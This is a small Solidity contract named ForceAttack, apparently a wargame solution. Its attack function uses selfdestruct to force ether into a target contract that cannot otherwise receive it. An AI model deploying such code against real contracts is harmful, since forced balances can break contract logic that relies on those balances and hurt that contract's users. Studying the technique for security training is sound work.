pragma solidity ^0.6.0;

contract ForceAttack {

    constructor() public payable {
    }
    
    function attack(address payable _adr) public {
        selfdestruct(_adr);
    }

}